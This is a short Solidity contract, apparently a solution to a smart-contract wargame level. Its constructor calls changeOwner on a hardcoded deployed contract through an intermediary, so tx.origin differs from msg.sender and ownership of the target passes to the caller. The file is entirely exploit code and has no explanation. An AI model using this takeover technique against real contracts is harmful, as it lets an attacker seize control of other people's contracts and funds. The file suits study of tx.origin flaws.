pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Telephone {
    ITelephone t = ITelephone(0x7BB551e6285EB6bc8FA3B00a3B1c30F7144A599F);
    constructor() {
        t.changeOwner(msg.sender);
    }
}